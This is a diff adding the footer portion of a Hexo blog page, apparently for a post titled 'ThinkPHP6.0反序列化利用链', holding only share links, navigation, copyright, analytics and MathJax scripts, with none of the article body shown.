+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&title=ThinkPHP6.0反序列化利用链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&is_video=false&description=ThinkPHP6.0反序列化利用链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ThinkPHP6.0反序列化利用链&body=Check out this article: http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&title=ThinkPHP6.0反序列化利用链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&title=ThinkPHP6.0反序列化利用链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&title=ThinkPHP6.0反序列化利用链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&title=ThinkPHP6.0反序列化利用链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&name=ThinkPHP6.0反序列化利用链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Sndav@Dubhe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives">Writing</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-143542187-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments --><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+
+</body>
+</html>
